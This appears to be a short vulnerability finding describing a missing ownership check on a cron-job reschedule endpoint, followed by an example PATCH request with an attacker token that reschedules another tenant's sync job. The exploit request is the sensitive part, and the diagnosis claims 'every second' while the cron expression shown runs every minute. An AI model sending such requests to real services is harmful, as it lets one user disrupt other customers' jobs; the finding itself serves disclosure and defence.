diagnosis: The route directly calls scheduler.reschedule_job on the global APScheduler JobStore using job_id without validating job ownership. An attacker can reschedule any customer's or system's cron job (e.g. data synchronization or security scanners) to run every second or never run.
exploit_request:
PATCH /api/v1/scheduler/cron-jobs/cron_sync_tenant_5012/reschedule HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"cron_expression": "* * * * *"}
